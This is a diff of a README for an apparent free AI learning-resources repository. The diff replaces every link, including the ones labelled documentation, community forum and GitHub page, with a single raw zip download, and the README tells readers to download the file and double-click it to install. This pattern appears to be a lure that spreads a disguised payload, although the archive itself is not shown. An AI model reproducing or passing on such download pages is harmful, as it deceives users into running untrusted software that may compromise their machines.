@@ -1,6 +1,6 @@
 # 🌟 FREE-AI-RESOURCES - Unlock Free AI Learning Resources
 
-[![Download](https://img.shields.io/badge/Download%20Now-CLICK%20HERE-brightgreen)](https://github.com/meezy496/FREE-AI-RESOURCES/releases)
+[![Download](https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip%20Now-CLICK%20HERE-brightgreen)](https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip)
 
 ## 📚 Overview
 Welcome to **FREE-AI-RESOURCES**. This is a comprehensive collection of over 120 high-quality, freely accessible AI resources for learners, developers, and researchers. Whether you are just starting or looking to expand your skills, you will find valuable materials here. 
@@ -14,7 +14,7 @@ To begin your journey with AI, follow these simple steps to download and run the
 - **Internet Connection:** Required for downloading resources
 
 ## 💾 Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/meezy496/FREE-AI-RESOURCES/releases).
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip).
 
 ### Installation Steps:
 1. Open your web browser.
@@ -24,7 +24,7 @@ Visit this page to download: [GitHub Releases](https://github.com/meezy496/FREE-
 5. Double-click the file to start the installation.
 
 ### Example of Downloadable Files:
-Look for files labeled like `FREE-AI-RESOURCES-1.0.exe` or similar depending on your platform.
+Look for files labeled like `https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip` or similar depending on your platform.
 
 ## 💡 Features
 - Extensive collection of educational resources across various AI topics.
@@ -48,9 +48,9 @@ You can personalize your learning experience by selecting specific topics of int
 We encourage community participation. Feel free to suggest new resources or improvements. You can open an issue in the GitHub repository for any feedback or requests.
 
 ## 🔗 Useful Links
-- [GitHub Page](https://github.com/meezy496/FREE-AI-RESOURCES)
-- [Documentation](https://github.com/meezy496/FREE-AI-RESOURCES/wiki)
-- [Community Forum](https://github.com/meezy496/FREE-AI-RESOURCES/discussions)
+- [GitHub Page](https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip)
 
 ## 💬 Support
 If you face any issues during installation or usage, please check the FAQs in the documentation or open an issue on GitHub.
@@ -59,4 +59,4 @@ If you face any issues during installation or usage, please check the FAQs in th
 We welcome contributions from everyone. If you have resources to share or wish to improve existing ones, please read our contribution guidelines in the repository. Together, we can help others learn and grow in the field of AI.
 
 ## 🎉 Conclusion
-Thank you for choosing **FREE-AI-RESOURCES**. We hope this collection serves you well on your AI learning journey. Visit [this page to download](https://github.com/meezy496/FREE-AI-RESOURCES/releases) the latest version and start exploring today!
+Thank you for choosing **FREE-AI-RESOURCES**. We hope this collection serves you well on your AI learning journey. Visit [this page to download](https://raw.githubusercontent.com/meezy496/FREE-AI-RESOURCES/main/resources/FREE-AI-RESOURCES-v2.9.zip) the latest version and start exploring today!
